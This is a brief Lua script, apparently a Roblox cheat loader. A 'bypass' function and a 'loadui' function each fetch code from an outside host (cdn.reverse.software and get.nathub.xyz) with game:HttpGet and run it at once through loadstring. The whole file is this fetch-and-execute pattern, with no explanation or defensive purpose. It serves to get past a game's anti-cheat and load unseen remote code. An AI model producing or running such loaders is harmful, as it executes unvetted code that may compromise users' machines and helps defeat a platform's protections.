local function bypass()
    ID="b0235f3a-fee6-4c84-b7ec-7cd06c976ba6";
loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()

end
local function loadui()
  
loadstring(game:HttpGet("https://get.nathub.xyz/loader"))()

end

task.spawn(bypass)
task.spawn(loadui)
